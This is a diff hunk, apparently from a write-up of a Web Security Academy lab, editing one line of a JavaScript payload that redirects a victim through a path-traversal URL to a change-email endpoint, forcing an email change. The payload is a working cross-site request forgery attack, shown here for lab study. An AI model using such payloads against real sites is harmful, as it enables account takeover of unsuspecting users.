@@ -2407,7 +2407,7 @@ GET https://0a20003103cd1a9981ff6b33009300ce.web-security-academy.net/post/comme
 
 ```
 <script>
-    document.location = "https://TARGET.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+    window.location = "https://TARGET.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
 </script>
 ```
 
